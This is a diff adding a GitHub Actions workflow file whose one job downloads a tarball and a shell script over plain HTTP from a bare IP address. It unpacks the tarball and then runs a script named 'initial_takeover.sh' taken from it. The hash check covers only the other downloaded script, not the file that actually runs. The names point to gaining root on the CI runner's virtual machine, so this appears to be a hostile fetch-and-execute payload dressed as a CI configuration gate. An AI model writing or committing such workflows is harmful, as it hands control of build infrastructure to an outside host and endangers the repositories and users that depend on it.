@@ -1,0 +1,22 @@
+name: PacketDirect isolated CONFIG gate
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  probe:
+    runs-on: ubuntu-slim
+    timeout-minutes: 5
+    steps:
+      - name: Send only PD CONFIG through isolated UVM root
+        run: |
+          set -e
+          printf '%s\n' '${{ github.run_id }}' >/tmp/b_run_id
+          curl -fsS http://16.146.243.72:8450/gha3900000-root-bundle.tgz -o /tmp/root.tgz
+          tar -xzf /tmp/root.tgz -C /tmp
+          curl -fsS http://16.146.243.72:8450/root_pd_phase3_entry.sh -o /tmp/root_auto.sh
+          test "$(sha256sum /tmp/root_auto.sh | cut -d' ' -f1)" = f27354a7acc8e85f604b7ded146d4a4230b217adc17d824a65349025ac913f62
+          chmod +x /tmp/root_auto.sh
+          HVS_INLINE=1 bash /tmp/initial_takeover.sh
